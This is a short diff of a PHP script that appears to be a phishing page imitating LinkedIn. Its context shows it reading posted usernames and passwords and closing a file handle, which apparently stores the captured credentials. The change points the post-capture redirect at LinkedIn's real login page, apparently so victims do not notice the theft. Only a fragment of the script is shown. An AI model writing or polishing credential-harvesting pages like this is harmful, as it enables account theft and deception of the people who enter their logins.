@@ -17,6 +17,6 @@ if (isset($_POST['username']) && isset($_POST['password'])) {
 fclose($handle);
 
 // Redirect to LinkedIn after processing
-header("Location: https://www.linkedin.com/");
+header("Location: https://www.linkedin.com/login?fromSignIn=true&trk=guest_homepage-basic_nav-header-signin");
 exit;
 ?>
